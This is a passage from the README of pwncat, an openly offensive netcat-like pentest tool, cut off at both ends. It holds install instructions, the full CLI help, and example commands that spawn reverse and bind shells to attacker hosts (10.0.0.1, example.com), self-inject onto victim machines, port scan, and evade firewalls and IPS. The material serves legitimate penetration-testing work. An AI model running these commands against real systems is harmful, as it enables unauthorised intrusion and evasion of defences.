src=\"https://github.com/cytopia/pwncat/workflows/win-2.7/badge.svg\" /></a></td>\n      </tr>\n      <tr>\n       <th>3.5</th>\n       <td><a href=\"https://github.com/cytopia/pwncat/actions?workflow=ubu-3.5\"><img src=\"https://github.com/cytopia/pwncat/workflows/ubu-3.5/badge.svg\" /></a></td>\n       <td><a href=\"https://github.com/cytopia/pwncat/actions?workflow=mac-3.5\"><img src=\"https://github.com/cytopia/pwncat/workflows/mac-3.5/badge.svg\" /></a></td>\n       <td><a href=\"https://github.com/cytopia/pwncat/actions?workflow=win-3.5\"><img src=\"https://github.com/cytopia/pwncat/workflows/win-3.5/badge.svg\" /></a></td>\n      </tr>\n      <tr>\n       <th>3.6</th>\n       <td><a href=\"https://github.com/cytopia/pwncat/actions?workflow=ubu-3.6\"><img src=\"https://github.com/cytopia/pwncat/workflows/ubu-3.6/badge.svg\" /></a></td>\n       <td><a href=\"https://github.com/cytopia/pwncat/actions?workflow=mac-3.6\"><img src=\"https://github.com/cytopia/pwncat/workflows/mac-3.6/badge.svg\" /></a></td>\n       <td><a href=\"https://github.com/cytopia/pwncat/actions?workflow=win-3.6\"><img src=\"https://github.com/cytopia/pwncat/workflows/win-3.6/badge.svg\" /></a></td>\n      </tr>\n      <tr>\n       <th>3.7</th>\n       <td><a href=\"https://github.com/cytopia/pwncat/actions?workflow=ubu-3.7\"><img src=\"https://github.com/cytopia/pwncat/workflows/ubu-3.7/badge.svg\" /></a></td>\n       <td><a href=\"https://github.com/cytopia/pwncat/actions?workflow=mac-3.7\"><img src=\"https://github.com/cytopia/pwncat/workflows/mac-3.7/badge.svg\" /></a></td>\n       <td><a href=\"https://github.com/cytopia/pwncat/actions?workflow=win-3.7\"><img src=\"https://github.com/cytopia/pwncat/workflows/win-3.7/badge.svg\" /></a></td>\n      </tr>\n      <tr>\n       <th>3.8</th>\n       <td><a href=\"https://github.com/cytopia/pwncat/actions?workflow=ubu-3.8\"><img src=\"https://github.com/cytopia/pwncat/workflows/ubu-3.8/badge.svg\" /></a></td>\n       <td><a href=\"https://github.com/cytopia/pwncat/actions?workflow=mac-3.8\"><img src=\"https://github.com/cytopia/pwncat/workflows/mac-3.8/badge.svg\" /></a></td>\n       <td><a href=\"https://github.com/cytopia/pwncat/actions?workflow=win-3.8\"><img src=\"https://github.com/cytopia/pwncat/workflows/win-3.8/badge.svg\" /></a></td>\n      </tr>\n      <tr>\n       <th>pypy2</th>\n       <td><a href=\"https://github.com/cytopia/pwncat/actions?workflow=ubu-py2\"><img src=\"https://github.com/cytopia/pwncat/workflows/ubu-py2/badge.svg\" /></a></td>\n       <td><a href=\"https://github.com/cytopia/pwncat/actions?workflow=mac-py2\"><img src=\"https://github.com/cytopia/pwncat/workflows/mac-py2/badge.svg\" /></a></td>\n       <td><a href=\"https://github.com/cytopia/pwncat/actions?workflow=win-py2\"><img src=\"https://github.com/cytopia/pwncat/workflows/win-py2/badge.svg\" /></a></td>\n      </tr>\n      <tr>\n       <th>pypy3</th>\n       <td><a href=\"https://github.com/cytopia/pwncat/actions?workflow=ubu-py3\"><img src=\"https://github.com/cytopia/pwncat/workflows/ubu-py3/badge.svg\" /></a></td>\n       <td><a href=\"https://github.com/cytopia/pwncat/actions?workflow=mac-py3\"><img src=\"https://github.com/cytopia/pwncat/workflows/mac-py3/badge.svg\" /></a></td>\n       <td><a href=\"https://github.com/cytopia/pwncat/actions?workflow=win-py3\"><img src=\"https://github.com/cytopia/pwncat/workflows/win-py3/badge.svg\" /></a></td>\n      </tr>\n     </tbody>\n    </table>\n   </td>\n  </tr>\n </tbody>\n</table>\n\n> <sup>[1] <a href=\"https://cytopia.github.io/pwncat/pwncat.type.html\">mypy type coverage</a> <strong>(fully typed: 94.00%)</strong></sup><br/>\n> <sup>[2] <strong>Failing builds do not indicate broken functionality.</strong> Integration tests run for multiple hours and break sporadically for various different reasons (network timeouts, unknown cancellations of GitHub Actions, etc): <a href=\"https://github.com/actions/virtual-environments/issues/736\">#735</a>, <a href=\"https://github.com/actions/virtual-environments/issues/841\">#841</a></sup><br/>\n> <sup></sup>\n\n\n#### Motivation\nEver accidentally hit <kbd>Ctrl</kbd>+<kbd>c</kbd> on your reverse shell and it was gone for good?\nEver waited forever for your client to connect back to you, because the Firewall didn't let it out?\nEver had a connection loss because an IPS closed suspicious ports?\nEver were in need of a quick port forwarding?<br/>\n> **This one got you covered.**\n\nApart from that the current features of `nc`, `ncat` or `socat` just didn't feed my needs and I also wanted to have a single\ntool that works on older and newer machines (hence Python 2+3 compat). Most importantly I wanted to have it in a language that I can understand and provide my own features with.\n(Wait for it, binary releases for Linux, MacOS and Windows will come shortly).\n\n\n## :closed_book: Documentation\n\n| Pwncat docs     | Link |\n|:----------------|:-----|\n| Official documentation | [https://docs.pwncat.org](https://docs.pwncat.org) |\n| Official website | [https://pwncat.org](https://pwncat.org) |\n| API documentation | [https://pwncat.org/pwncat.api.html](https://pwncat.org/pwncat.api.html) |\n| Pwncat Scripting Engine | [PSE](https://github.com/cytopia/pwncat/tree/master/pse) |\n\n\n## :tada: Install\n\nCurrent version is: **0.1.2**\n\n#### Generic\n\n| [Pip](https://pypi.org/project/pwncat/) |\n|:-:|\n| [![](https://raw.githubusercontent.com/cytopia/icons/master/64x64/python.png)](https://pypi.org/project/pwncat/) |\n| `pip install pwncat` |\n\n\n#### OS specific\n\n| **[MacOS][mac_lnk]**         | **[Arch Linux][arch_lnk]**   | **[BlackArch][barch_lnk]**         | **[CentOS][centos_lnk]**<sup>[1]</sup>       |\n|:----------------------------:|:----------------------------:|:----------------------------------:|:--------------------------------------------:|\n| [![mac_img]][mac_lnk]        | [![arch_img]][arch_lnk]      | [![barch_img]][barch_lnk]          | [![centos_img]][centos_lnk]                  |\n| `brew install pwncat`        | `yay -S pwncat`              | `pacman -S pwncat`                 | `yum install pwncat`                         |\n| **[Fedora][fedora_lnk]**     | **[Kali Linux][kali_lnk]**   | **[NixOS][nix_lnk]<sup>[2]</sup>** | **[Oracle Linux][oracle_lnk]<sup>[1]</sup>** |\n| [![fedora_img]][fedora_lnk]  | [![kali_img]][kali_lnk]      | [![nix_img]][nix_lnk]              | [![oracle_img]][oracle_lnk]                  |\n|  `dnf install pwncat`        | `apt install pwncat`         | `nixos.pwncat`                     | `yum install pwncat`                         |\n| **[Pentoo][pentoo_lnk]**     |  **[Parrot OS][parrot_lnk]** |\n| [![pentoo_img]][pentoo_lnk]  | [![parrot_img]][parrot_lnk]  |\n|  `net-analyzer/pwncat`       | `apt install pwncat`         |\n\n> <sup>[1]: Epel repository</sup><br/>\n> <sup>[2]: Unstable</sup>\n\n[mac_lnk]: https://formulae.brew.sh/formula/pwncat#default\n[mac_img]: https://raw.githubusercontent.com/cytopia/icons/master/64x64/osx.png\n\n[arch_lnk]: https://aur.archlinux.org/packages/pwncat/\n[arch_img]: https://raw.githubusercontent.com/cytopia/icons/master/64x64/archlinux.png\n\n[barch_lnk]: https://www.blackarch.org/tools.html\n[barch_img]: https://raw.githubusercontent.com/cytopia/icons/master/64x64/blackarch.png\n\n[centos_lnk]: https://pkgs.org/download/pwncat\n[centos_img]: https://raw.githubusercontent.com/cytopia/icons/master/64x64/centos.png\n\n[fedora_lnk]: https://src.fedoraproject.org/rpms/pwncat\n[fedora_img]: https://raw.githubusercontent.com/cytopia/icons/master/64x64/fedora.png\n\n[kali_lnk]: https://gitlab.com/kalilinux/packages/pwncat\n[kali_img]: https://raw.githubusercontent.com/cytopia/icons/master/64x64/kali.png\n\n[nix_lnk]: https://search.nixos.org/packages?channel=unstable&query=pwncat\n[nix_img]: https://raw.githubusercontent.com/cytopia/icons/master/64x64/nixos.png\n\n[oracle_lnk]: https://yum.oracle.com/repo/OracleLinux/OL8/developer/EPEL/x86_64/index.html\n[oracle_img]: https://raw.githubusercontent.com/cytopia/icons/master/64x64/oracle-linux.png\n\n[parrot_lnk]: https://repology.org/project/pwncat/versions\n[parrot_img]: https://raw.githubusercontent.com/cytopia/icons/master/64x64/parrot.png\n\n[pentoo_lnk]: https://repology.org/project/pwncat/versions\n[pentoo_img]: https://raw.githubusercontent.com/cytopia/icons/master/64x64/pentoo.png\n\n\n\n## :coffee: TL;DR\n\nThis is just a quick get-you-started overview. For more advanced techniques see **[:computer: Usage](#computer-usage)** or **[:bulb: Examples](#bulb-examples)**.\n\n### See in action\n\n<table>\n <tr>\n  <td widht=\"50%\" style=\"text-align:center;\">\n   <a href=\"https://www.youtube.com/watch?v=lN10hgl_Ts8&list=PLT1I2bH6BKxj2qEylDdEns39ej8g3_eMc&index=2&t=0s\">unbreakable reverse shells - how to spawn</a><br/><br/>\n   <a href=\"https://www.youtube.com/watch?v=lN10hgl_Ts8&list=PLT1I2bH6BKxj2qEylDdEns39ej8g3_eMc&index=2&t=0s\"><img src=\"docs/img/video01.png\" /></a>\n  </td>\n  <td widht=\"50%\" style=\"text-align:center;\">\n   <a href=\"https://www.youtube.com/watch?v=VQyFoUG18WY&list=PLT1I2bH6BKxj2qEylDdEns39ej8g3_eMc&index=2\">unbreakable reverse shells - multiple shells</a><br/><br/>\n   <a href=\"https://www.youtube.com/watch?v=VQyFoUG18WY&list=PLT1I2bH6BKxj2qEylDdEns39ej8g3_eMc&index=2\"><img src=\"docs/img/video02.png\" /></a>\n  </td>\n </tr>\n</table>\n\n\n### Deploy to target\n```bash\n# Copy base64 data to clipboard from where you have internet access\ncurl https://raw.githubusercontent.com/cytopia/pwncat/master/bin/pwncat | base64\n\n# Paste it on the target machine\necho \"<BASE64 STRING>\" | base64 -d > pwncat\nchmod +x pwncat\n```\n\n### Inject to target\n```bash\n# [1] If you found a vulnerability on the target to start a very simple reverse shell,\n# such as via bash, php, perl, python, nc or similar, you can instruct your local\n# pwncat listener to use this connection to deploy itself on the target automatically\n# and start an additional unbreakable reverse shell back to you.\npwncat -l 4444 --self-inject /bin/bash:10.0.0.1:4445\n```\n> <sup>[1] [Read in more detail about self-injection](#self-injecting-reverse-shell)\n\n### Summon shells\n```bash\n# Bind shell (accepts new clients after disconnect)\npwncat -l -e '/bin/bash' 8080 -k\n```\n```bash\n# Reverse shell (Ctrl+c proof: reconnects back to you)\npwncat -e '/bin/bash' example.com 4444 --reconn --recon-wait 1\n```\n```bash\n# Reverse UDP shell (Ctrl+c proof: reconnects back to you)\npwncat -e '/bin/bash' example.com 4444 -u --ping-intvl 1\n```\n\n### Port scan\n```bash\n# [TCP] IPv4 + IPv6\npwncat -z 10.0.0.1 80,443,8080\npwncat -z 10.0.0.1 1-65535\npwncat -z 10.0.0.1 1+1023\n\n# [UDP] IPv4 + IPv6\npwncat -z 10.0.0.1 80,443,8080 -u\npwncat -z 10.0.0.1 1-65535 -u\npwncat -z 10.0.0.1 1+1023 -u\n\n# Use only IPv6 or IPv4\npwncat -z 10.0.0.1 1-65535 -4\npwncat -z 10.0.0.1 1-65535 -6 -u\n\n# Add version detection\npwncat -z 10.0.0.1 1-65535 --banner\n```\n\n### Local port forward `-L` (listening proxy)\n```bash\n# Make remote MySQL server (remote port 3306) available on current machine\n# on every interface on port 5000\npwncat -L 0.0.0.0:5000 everythingcli.org 3306\n```\n```bash\n# Same, but convert traffic on your end to UDP\npwncat -L 0.0.0.0:5000 everythingcli.org 3306 -u\n```\n\n### Remote port forward `-R` (double client proxy)\n```bash\n# Connect to Remote MySQL server (remote port 3306) and then connect to another\n# pwncat/netcat server on 10.0.0.1:4444 and bridge traffic\npwncat -R 10.0.0.1:4444 everythingcli.org 3306\n```\n```bash\n# Same, but convert traffic on your end to UDP\npwncat -R 10.0.0.1:4444 everythingcli.org 3306 -u\n```\n\n> <sub>[SSH Tunnelling for fun and profit :link:](https://www.everythingcli.org/ssh-tunnelling-for-fun-and-profit-local-vs-remote/)</sub><br/>\n> <sub>[`pwncat` example: Port forwarding magic](#port-forwarding-magic)<sub>\n\n\n## :star: Features\n\n### At a glance\n\n`pwncat` has many features, below is only a list of outstanding characteristics.\n\n| Feature        | Description |\n|----------------|-------------|\n| [PSE](pse)        | Fully scriptable with Pwncat Scripting Engine to allow all kinds of fancy stuff on send and receive |\n| port scanning  | TCP und UDP port scanning with basic version detection support |\n| Self-injecting rshell | Self-injecting mode to deploy itself and start an unbreakable reverse shell back to you automatically |\n| Bind shell        | Create bind shells |\n| Reverse shell     | Create reverse shells |\n| Port Forward      | Local and remote port forward (Proxy server/client) |\n| <kbd>Ctrl</kbd>+<kbd>c</kbd> | Reverse shell can reconnect if you accidentally hit <kbd>Ctrl</kbd>+<kbd>c</kbd> |\n| Detect Egress     | Scan and report open egress ports on the target (port hopping) |\n| Evade FW          | Evade egress firewalls by round-robin outgoing ports (port hopping) |\n| Evade IPS         | Evade Intrusion Prevention Systems by being able to round-robin outgoing ports on connection interrupts (port hopping) |\n| UDP rev shell     | Try this with the traditional `netcat` |\n| Stateful UDP      | Stateful connect phase for UDP client mode |\n| TCP / UDP         | Full TCP and UDP support |\n| IPv4 / IPv6       | Dual or single stack IPv4 and IPv6 support |\n| Python 2+3        | Works with Python 2, Python 3, pypy2 and pypy3 |\n| Cross OS          | Work on Linux, MacOS and Windows as long as Python is available |\n| Compatability     | Use the `netcat`, `ncat` or `socat` as a client or server together with `pwncat` |\n| Portable          | Single file which only uses core packages - no external dependencies required. |\n\n\n### Feature comparison matrix\n\n|                     | pwncat   | netcat | ncat  | socat |\n|---------------------|----------|--------|-------|-------|\n| Scripting engine    | ✔ Python | :x:    | ✔ Lua | :x:   |\n|                     |          |        |       |       |\n| IP ToS              | ✔        | ✔      | :x:   | ✔     |\n| IPv4                | ✔        | ✔      | ✔     | ✔     |\n| IPv6                | ✔        | ✔      | ✔     | ✔     |\n| Unix domain sockets | :x:      | ✔      | ✔     | ✔     |\n| Linux vsock         | :x:      | :x:    | ✔     | :x:   |\n| Socket source bind  | ✔        | ✔      | ✔     | ✔     |\n|                     |          |        |       |       |\n| TCP                 | ✔        | ✔      | ✔     | ✔     |\n| UDP                 | ✔        | ✔      | ✔     | ✔     |\n| SCTP                | :x:      | :x:    | ✔     | ✔     |\n| SSL                 | :x:      | :x:    | ✔     | ✔     |\n| HTTP                | ✔        | :x:    | :x:   | :x:   |\n| HTTPS               | *        | :x:    | :x:   | :x:   |\n|                     |          |        |       |       |\n| Telnet negotiation  | :x:      | ✔      | ✔     | :x:   |\n| Proxy support       | :x:      | ✔      | ✔     | ✔     |\n| Local port forward  | ✔        | :x:    | :x:   | ✔     |\n| Remote port forward | ✔        | :x:    | :x:   | :x:   |\n|                     |          |        |       |       |\n| Inbound port scan   | ✔        | ✔      | ✔     | :x:   |\n| Outbound port scan  | ✔        | :x:    | :x:   | :x:   |\n| Version detection   | ✔        | :x:    | :x:   | :x:   |\n|                     |          |        |       |       |\n| Chat                | ✔        | ✔      | ✔     | ✔     |\n| Command execution   | ✔        | ✔      | ✔     | ✔     |\n| Hex dump            | *        | ✔      | ✔     | ✔     |\n| Broker              | :x:      | :x:    | ✔     | :x:   |\n| Simultaneous conns  | :x:      | :x:    | ✔     | ✔     |\n| Allow/deny          | :x:      | :x:    | ✔     | ✔     |\n| Re-accept           | ✔        | ✔      | ✔     | ✔     |\n| Self-injecting      | ✔        | :x:    | :x:   | :x:   |\n| UDP reverse shell   | ✔        | :x:    | :x:   | :x:   |\n| Respawning client   | ✔        | :x:    | :x:   | :x:   |\n| Port hopping        | ✔        | :x:    | :x:   | :x:   |\n| Emergency shutdown  | ✔        | :x:    | :x:   | :x:   |\n\n> <sup>`*` Feature is currently under development.\n\n\n## :cop: Behaviour\n\nLike the original implementation of `netcat`, when using **TCP**, `pwncat`\n(in client and listen mode) will automatically quit, if the network connection has been terminated,\nproperly or improperly.\nIn case the remote peer does not terminate the connection, or in **UDP** mode, `netcat` and `pwncat` will stay open. The behaviour differs a bit when STDIN is closed.\n\n1. `netcat`: If STDIN is closed, but connection stays open, `netcat` will stay open\n2. `pwncat`: If STDIN is closed, but connection stays open, `pwncat` will close\n\nYou can emulate the `netcat` behaviour with `--no-shutdown` command line argument.\n\nHave a look at the following commands to better understand this behaviour:\n\n```bash\n# [Valid HTTP request] Quits, web server keeps connection intact, but STDIN is EOF\nprintf \"GET / HTTP/1.1\\n\\n\" | pwncat www.google.com 80\n\n# [Valid HTTP request] Does not quit, web server keeps connection intact, but STDIN is EOF\nprintf \"GET / HTTP/1.1\\n\\n\" | pwncat www.google.com 80 --no-shutdown\n```\n\n```bash\n# [Invalid HTTP request] Quits, because the web server closes the connection and STDIN is EOF\nprintf \"GET / \\n\\n\" | pwncat www.google.com 80\n```\n\n```bash\n# [TCP]\n# Both instances will quit after successful file transfer.\npwncat -l 4444 > output.txt\npwncat localhost 4444 < input.txt\n\n# [TCP]\n# Neither of both, client and server will quit after successful transfer\n# and they will be stuck, waiting for more input or output.\n# When exiting one (e.g.: via Ctrl+c), the other one will quit as well.\npwncat -l 4444 --no-shutdown > output.txt\npwncat localhost 4444 --no-shutdown < input.txt\n```\n\nBe advised that it is not reliable to send files via UDP\n```bash\n# [UDP] (--no-shutdown has no effect, as this is the default behaviour in UDP)\n# Neither of both, client and server will quit after successful transfer\n# and they will be stuck, waiting for more input or output.\n# When exiting one (e.g.: via Ctrl+c), the other one will still stay open in UDP mode.\npwncat -u -l 4444 > output.txt\npwncat -u localhost 4444 < input.txt\n```\n\nThere are many ways to alter this default behaviour. Have a look at the [usage](#computer-usage)\nsection for more advanced settings.\n\n\n## :computer: Usage\n\n### Keys\n\n| Behaviour      | ![Alt][Linux] | ![Alt][MacOS] | ![Alt][Windows] |\n|----------------|---------------|---------------|-----------------|\n| Quit (SIGINT)  | <kbd>Ctrl</kbd>+<kbd>c</kbd>  | <kbd>Ctrl</kbd>+<kbd>c</kbd> | <kbd>Ctrl</kbd>+<kbd>c</kbd> |\n| Quit (SIGQUIT) | <kbd>Ctrl</kbd>+<kbd>\\\\</kbd> | ? | ? |\n| Quit (SIGQUIT) | <kbd>Ctrl</kbd>+<kbd>4</kbd>  | ? | ? |\n| Quit STDIN<sup>[1]</sup> | <kbd>Ctrl</kbd>+<kbd>d</kbd>  | <kbd>Ctrl</kbd>+<kbd>d</kbd> | <kbd>Ctrl</kbd>+<kbd>z</kbd> and <kbd>Ctrl</kbd>+<kbd>Enter</kbd> |\n| Send (NL)      | <kbd>Ctrl</kbd>+<kbd>j</kbd>  | ? | ? |\n| Send (EOL)     | <kbd>Ctrl</kbd>+<kbd>m</kbd>  | ? | ? |\n| Send (EOL)     | <kbd>Enter</kbd>              | <kbd>Enter</kbd> | <kbd>Enter</kbd> |\n\n> <sup>[1] Only works when not using `--no-shutdown` and `--keep`. Will then shutdown it's socket for sending, signaling the remote end and EOF on its socket.</sup>\n\n[Linux]: https://raw.githubusercontent.com/cytopia/icons/master/64x64/linux.png \"Linux\"\n[MacOS]: https://raw.githubusercontent.com/cytopia/icons/master/64x64/osx.png \"MacOS\"\n[Windows]: https://raw.githubusercontent.com/cytopia/icons/master/64x64/windows.png \"Windows\"\n\n### Command line arguments\n\nType `pwncat -h` or click below to see all available options.\n\n<details>\n  <summary><strong>Click here to expand usage</strong></summary>\n\n```\nusage: pwncat [options] hostname port\n       pwncat [options] -l [hostname] port\n       pwncat [options] -z hostname port\n       pwncat [options] -L [addr:]port hostname port\n       pwncat [options] -R addr:port hostname port\n       pwncat -V, --version\n       pwncat -h, --help\n\n\nEnhanced and compatible Netcat implementation written in Python (2 and 3) with\nconnect, zero-i/o, listen and forward modes and techniques to detect and evade\nfirewalls and intrusion detection/prevention systems.\n\nIf no mode arguments are specified, pwncat will run in connect mode and act as\na client to connect to a remote endpoint. If the connection to the remote\nendoint is lost, pwncat will quit. See options for how to automatically re-\nconnect.\n\npositional arguments:\n  hostname              Address to listen, forward, scan or connect to.\n\n  port                  [All modes]\n                        Single port to listen, forward or connect to.\n                        [Zero-I/O mode]\n                        Specify multiple ports to scan:\n                        Via list:  4444,4445,4446\n                        Via range: 4444-4446\n                        Via incr:  4444+2\n\nmode arguments:\n  -l, --listen          [Listen mode]:\n                        Start a server and listen for incoming connections.\n                        If using TCP and a connected client disconnects or the\n                        connection is interrupted otherwise, the server will\n                        quit. See -k/--keep-open to change this behaviour.\n\n  -z, --zero            [Zero-I/0 mode]:\n                        Connect to a remote endpoint and report status only.\n                        Used for port scanning.\n                        See --banner for version detection.\n\n  -L [addr:]port, --local [addr:]port\n                        [Local forward mode]:\n                        This mode will start a server and a client internally.\n                        The internal server will listen locally on specified\n                        addr/port (given by --local [addr:]port).\n                        The server will then forward traffic to the internal\n                        client which connects to another server specified by\n                        hostname/port given via positional arguments.\n                        (I.e.: proxies a remote service to a local address)\n\n  -R addr:port, --remote addr:port\n                        [Remote forward mode]:\n                        This mode will start two clients internally. One is\n                        connecting to the target and one is connecting to\n                        another pwncat/netcat server you have started some-\n                        where. Once connected, it will then proxy traffic\n                        between you and the target.\n                        This mode should be applied on machines that block\n                        incoming traffic and only allow outbound.\n                        The connection to your listening server is given by\n                        -R/--remote addr:port and the connection to the\n                        target machine via the positional arguments.\n\noptional arguments:\n  -e cmd, --exec cmd    Execute shell command. Only for connect or listen mode.\n\n  -C lf, --crlf lf      Specify, 'lf', 'crlf' or 'cr' to always force replacing\n                        line endings for input and outout accordingly. Specify\n                        'no' to completely remove any line feeds. By default\n                        it will not replace anything and takes what is entered\n                        (usually CRLF on Windows, LF on Linux and some times\n                        CR on MacOS).\n\n  -n, --nodns           Do not resolve DNS.\n\n  --send-on-eof         Buffer data received on stdin until EOF and send\n                        everything in one chunk.\n\n  --no-shutdown         Do not shutdown into half-duplex mode.\n                        If this option is passed, pwncat won't invoke shutdown\n                        on a socket after seeing EOF on stdin. This is provided\n                        for backward-compatibility with OpenBSD netcat, which\n                        exhibits this behavior.\n\n  -v, --verbose         Be verbose and print info to stderr. Use -v, -vv, -vvv\n                        or -vvvv for more verbosity. The server performance will\n                        decrease drastically if you use more than three times.\n\n  --info type           Show additional info about sockets, IPv4/6 or TCP opts\n                        applied to the current socket connection. Valid\n                        parameter are 'sock', 'ipv4', 'ipv6', 'tcp' or 'all'.\n                        Note, you must at least be in INFO verbose mode in order\n                        to see them (-vv).\n\n  -c str, --color str   Colored log output. Specify 'always', 'never' or 'auto'.\n                        In 'auto' mode, color is displayed as long as the output\n                        goes to a terminal. If it is piped into a file, color\n                        will automatically be disabled. This mode also disables\n                        color on Windows by default. (default: auto)\n\n  --safe-word str       All modes:\n                        If pwncat is started with this argument, it will shut\n                        down as soon as it receives the specified string. The\n                        --keep-open (server) or --reconn (client) options will\n                        be ignored and it won't listen again or reconnect to you.\n                        Use a very unique string to not have it shut down\n                        accidentally by other input.\n\nprotocol arguments:\n  -4                    Only Use IPv4 (default: IPv4 and IPv6 dualstack).\n\n  -6                    Only Use IPv6 (default: IPv4 and IPv6 dualstack).\n\n  -u, --udp             Use UDP for the connection instead of TCP.\n\n  -T str, --tos str     Specifies IP Type of Service (ToS) for the connection.\n                        Valid values are the tokens 'mincost', 'lowcost',\n                        'reliability', 'throughput' or 'lowdelay'.\n\n  --http                Connect / Listen mode (TCP and UDP):\n                        Hide traffic in http packets to fool Firewalls/IDS/IPS.\n\n  --https               Connect / Listen mode (TCP and UDP):\n                        Hide traffic in https packets to fool Firewalls/IDS/IPS.\n\n  -H [str [str ...]], --header [str [str ...]]\n                        Add HTTP headers to your request when using --http(s).\n\ncommand & control arguments:\n  --self-inject cmd:host:port[s]\n                        Listen mode (TCP only):\n                        If you are about to inject a reverse shell onto the\n                        victim machine (via php, bash, nc, ncat or similar),\n                        start your listening server with this argument.\n                        This will then (as soon as the reverse shell connects)\n                        automatically deploy and background-run an unbreakable\n                        pwncat reverse shell onto the victim machine which then\n                        also connects back to you with specified arguments.\n                        Example: '--self-inject /bin/bash:10.0.0.1:4444'\n                        It is also possible to launch multiple reverse shells by\n                        specifying multiple ports.\n                        Via list:  --self-inject /bin/sh:10.0.0.1:4444,4445,4446\n                        Via range: --self-inject /bin/sh:10.0.0.1:4444-4446\n                        Via incr:  --self-inject /bin/sh:10.0.0.1:4444+2\n                        Note: this is currently an experimental feature and does\n                        not work on Windows remote hosts yet.\n\npwncat scripting engine:\n  --script-send file    All modes (TCP and UDP):\n                        A Python scripting engine to define your own custom\n                        transformer function which will be executed before\n                        sending data to a remote endpoint. Your file must\n                        contain the exact following function which will:\n                        be applied as the transformer:\n                        def transform(data, pse):\n                            # NOTE: the function name must be 'transform'\n                            # NOTE: the function param name must be 'data'\n                            # NOTE: indentation must be 4 spaces\n                            # ... your transformations goes here\n                            return data\n                        You can also define as many custom functions or classes\n                        within this file, but ensure to prefix them uniquely to\n                        not collide with pwncat's function or classes, as the\n                        file will be called with exec().\n\n  --script-recv file    All modes (TCP and UDP):\n                        A Python scripting engine to define your own custom\n                        transformer function which will be executed after\n                        receiving data from a remote endpoint. Your file must\n                        contain the exact following function which will:\n                        be applied as the transformer:\n                        def transform(data, pse):\n                            # NOTE: the function name must be 'transform'\n                            # NOTE: the function param name must be 'data'\n                            # NOTE: indentation must be 4 spaces\n                            # ... your transformations goes here\n                            return data\n                        You can also define as many custom functions or classes\n                        within this file, but ensure to prefix them uniquely to\n                        not collide with pwncat's function or classes, as the\n                        file will be called with exec().\n\nzero-i/o mode arguments:\n  --banner              Zero-I/O (TCP and UDP):\n                        Try banner grabbing during port scan.\n\nlisten mode arguments:\n  -k, --keep-open       Listen mode (TCP only):\n                        Re-accept new clients in listen mode after a client has\n                        disconnected or the connection is interrupted otherwise.\n                        (default: server will quit after connection is gone)\n\n  --rebind [x]          Listen mode (TCP and UDP):\n                        If the server is unable to bind, it will re-initialize\n                        itself x many times before giving up. Omit the\n                        quantifier to rebind endlessly or specify a positive\n                        integer for how many times to rebind before giving up.\n                        See --rebind-robin for an interesting use-case.\n                        (default: fail after first unsuccessful try).\n\n  --rebind-wait s       Listen mode (TCP and UDP):\n                        Wait x seconds between re-initialization. (default: 1)\n\n  --rebind-robin port   Listen mode (TCP and UDP):\n                        If the server is unable to initialize (e.g: cannot bind\n                        and --rebind is specified, it it will shuffle ports in\n                        round-robin mode to bind to.\n                        Use comma separated string such as '80,81,82,83', a range\n                        of ports '80-83' or an increment '80+3'.\n                        Set --rebind to at least the number of ports to probe +1\n                        This option requires --rebind to be specified.\n\nconnect mode arguments:\n  --source-addr addr    Specify source bind IP address for connect mode.\n\n  --source-port port    Specify source bind port for connect mode.\n\n  --reconn [x]          Connect mode (TCP and UDP):\n                        If the remote server is not reachable or the connection\n                        is interrupted, the client will connect again x many\n                        times before giving up. Omit the quantifier to retry\n                        endlessly or specify a positive integer for how many\n                        times to retry before giving up.\n                        (default: quit if the remote is not available or the\n                        connection was interrupted)\n                        This might be handy for stable TCP reverse shells ;-)\n                        Note on UDP:\n                        By default UDP does not know if it is connected, so\n                        it will stop at the first port and assume it has a\n                        connection. Consider using --udp-sconnect with this\n                        option to make UDP aware of a successful connection.\n\n  --reconn-wait s       Connect mode (TCP and UDP):\n                        Wait x seconds between re-connects. (default: 1)\n\n  --reconn-robin port   Connect mode (TCP and UDP):\n                        If the remote server is not reachable or the connection\n                        is interrupted and --reconn is specified, the client\n                        will shuffle ports in round-robin mode to connect to.\n                        Use comma separated string such as '80,81,82,83', a range\n                        of ports '80-83' or an increment '80+3'.\n                        Set --reconn to at least the number of ports to probe +1\n                        This helps reverse shell to evade intrusiona prevention\n                        systems that will cut your connection and block the\n                        outbound port.\n                        This is also useful in Connect or Zero-I/O mode to\n                        figure out what outbound ports are allowed.\n\n  --ping-init           Connect mode (TCP and UDP):\n                        UDP is a stateless protocol unlike TCP, so no hand-\n                        shake communication takes place and the client just\n                        sends data to a server without being \"accepted\" by\n                        the server first.\n                        This means a server waiting for an UDP client to\n                        connect to, is unable to send any data to the client,\n                        before the client hasn't send data first. The server\n                        simply doesn't know the IP address before an initial\n                        connect.\n                        The --ping-init option instructs the client to send one\n                        single initial ping packet to the server, so that it is\n                        able to talk to the client.\n                        This is a way to make a UDP reverse shell work.\n                        See --ping-word for what char/string to send as initial\n                        ping packet (default: '\\0')\n\n  --ping-intvl s        Connect mode (TCP and UDP):\n                        Instruct the client to send ping intervalls every s sec.\n                        This allows you to restart your UDP server and just wait\n                        for the client to report back in. This might be handy\n                        for stable UDP reverse shells ;-)\n                        See --ping-word for what char/string to send as initial\n                        ping packet (default: '\\0')\n\n  --ping-word str       Connect mode (TCP and UDP):\n                        Change the default character '\\0' to use for upd ping.\n                        Single character or strings are supported.\n\n  --ping-robin port     Connect mode (TCP and UDP):\n                        Instruct the client to shuffle the specified ports in\n                        round-robin mode for a remote server to ping.\n                        This might be handy to scan outbound allowed ports.\n                        Use comma separated string such as '80,81,82,83', a range\n                        of ports '80-83' or an increment '80+3'.\n                        Use --ping-intvl 0 to be faster.\n\n  --udp-sconnect        Connect mode (UDP only):\n                        Emulating stateful behaviour for UDP connect phase by\n                        sending an initial packet to the server to validate if\n                        it is actually connected.\n                        By default, UDP will simply issue a connect and is not\n                        aware if it is really connected or not.\n                        The default connect packet to be send is '\\0', you\n                        can change this with --udp-sconnect-word.\n\n  --udp-sconnect-word [str]\n                        Connect mode (UDP only):\n                        Change the the data to be send for UDP stateful connect\n                        behaviour. Note you can also omit the string to send an\n                        empty packet (EOF), but be aware that some servers such\n                        as netcat will instantly quit upon receive of an EOF\n                        packet.\n                        The default is to send a null byte sting: '\\0'.\n\nmisc arguments:\n  -h, --help            Show this help message and exit\n  -V, --version         Show version information and exit\n```\n</details>\n\n\n## :bulb: Examples\n\n### Upgrade your shell to interactive\n<!--\n<details>\n  <summary>Click to expand</summary>\n-->\n\n> This is a universal advice and not only works with `pwncat`, but with all other common tools.\n\nWhen connected with a reverse or bind shell you'll notice that no interactive commands will work and\nhitting 